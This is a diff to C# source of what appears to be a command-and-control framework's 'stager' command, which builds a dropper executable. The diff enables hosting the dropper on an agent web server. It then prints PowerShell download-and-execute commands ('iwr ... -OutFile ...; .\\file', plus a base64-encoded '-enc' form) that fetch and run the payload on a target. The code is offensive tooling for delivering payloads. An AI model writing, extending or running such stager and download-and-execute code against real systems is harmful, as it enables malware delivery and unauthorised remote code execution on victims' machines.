@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 using Commander.Internal;
 using System.IO;
 using System.Text.RegularExpressions;
+using Commander.Commands.Agent;
 
 namespace Commander.Commands.Laucher
 {
@@ -37,7 +38,7 @@ namespace Commander.Commands.Laucher
         public override string Description => "Create a stager file";
         public override string Name => "stager";
 
-        public override ExecutorMode AvaliableIn => ExecutorMode.Agent;
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
 
         public override RootCommand Command => new RootCommand(this.Description)
         {
@@ -46,7 +47,7 @@ namespace Commander.Commands.Laucher
             new Option<string>(new[] { "--fileName", "-f" }, () => null ,"Nome of the file to be crafted"),
             new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
             new Option<string>(new[] { "--save", "-s" }, () => null, "Folder to save the generated file"),
-            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
+            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the agent Web Host"),
             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
         };
@@ -88,6 +89,10 @@ namespace Commander.Commands.Laucher
                 //context.Terminal.WriteLine(ex.ToString());
             }
 
+            url += "/wh/";
+
+
+
             var outFile = context.Options.fileName;
             if(string.IsNullOrEmpty(outFile))
             {
@@ -121,6 +126,7 @@ namespace Commander.Commands.Laucher
                 fileName += "-x86";
             fileName += ".b64";
 
+            
             parms.Insert(4, $"-d:ServerUrl={url}");
             parms.Insert(5, $"-d:DotNetParams={endpoint}");
             parms.Insert(6, $"-d:FileName={fileName}");
@@ -142,29 +148,24 @@ namespace Commander.Commands.Laucher
             context.Terminal.WriteSuccess($"[*] Build succeed.");
             context.Terminal.WriteInfo($"Dropper can be found at {outPath}");
 
-            //TODO should send to be hosted in the agent web server
-            /*if (context.Options.webhost)
+            
+            if (context.Options.webhost)
             {
+
                 byte[] fileContent = File.ReadAllBytes(outPath);
-                context.CommModule.WebHost(outFile, fileContent);
+                await WebHostCommand.PushFile(context, outFile, fileContent);
+ 
+                string urlwh = $"{url}{outFile}";
+                context.Terminal.WriteLine($"[*] dropper hosted on : {urlwh}");
 
-                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/wh/{outFile}";
-                context.Terminal.WriteLine($"[*] dropper hosted on : {url}");
-
-                string script = $"iwr -Uri '{url}' -OutFile '{outFile}'; .\\{outFile}";
-
-                if (listener.Secured)
-                {
-
-                    script = PowershellSSlScript + script;
-                }
+                string script = $"iwr -Uri '{urlwh}' -OutFile '{outFile}'; .\\{outFile}";
 
                 string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
 
                 //string encoded = Encoding.UTF8.GetString(utf8String)
                 context.Terminal.WriteLine($"[>] Command : powershell -c \"{script}\"");
                 context.Terminal.WriteLine($"[>] Command : powershell -enc {enc64}");
-            }*/
+            }
 
             return true;
         }
